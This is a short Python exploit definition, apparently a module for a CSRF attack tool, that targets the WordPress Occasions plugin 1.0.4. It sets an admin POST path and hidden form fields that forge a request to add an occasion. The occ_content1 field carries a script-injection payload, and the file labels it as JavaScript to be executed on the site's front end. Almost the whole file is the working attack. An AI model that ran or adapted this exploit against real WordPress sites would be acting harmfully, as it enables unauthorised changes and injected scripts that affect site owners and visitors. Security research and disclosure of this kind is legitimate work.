# -*- coding: utf-8 -*-

NAME = "WordPress Occasions Plugin 1.0.4 CSRF"
DESCRIPTION = '''You can use the CSRF vulnerability to add/delete Occasions. It is also possible to enter JavaScript in occ_content1 parameter when occ_type1=1 . Think this is a feature not a bug, anyway because of the CSRF vulnerability this can be used to execute arbitrary JavaScript in the front-end area (shortcode = [Occasions]).'''

AUTHOR = "m3tamantra"
AUTHOR_URL = "http://m3tamantra.wordpress.com/blog"
DATE = "2013-03-18"

METHOD = "POST"
PATH = "/wp-admin/options-general.php?page=occasions/occasions.php"

PARAMS = [
    {
        "type": "hidden",
        "name": "action",
        "value": "saveoccasions",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "nodes[]",
        "value": "1",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "occ_title1",
        "value": "CSRF Vulnerability",
        "custom": True,
        "description": "Title of the new occasion."
    },
    {
        "type": "hidden",
        "name": "occ_startdate1",
        "value": "18.03.",
        "custom": True,
        "description": "Start date of the new occasion."
    },
    {
        "type": "hidden",
        "name": "occ_enddate1",
        "value": "18.03.",
        "custom": True,
        "description": "End date of the new occasion."
    },
    {
        "type": "hidden",
        "name": "occ_type1",
        "value": "1",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "occ_content1",
        "value": "<script>alert(1)</script>",
        "custom": True,
        "description": "JavaScript code to be executed."
    }
]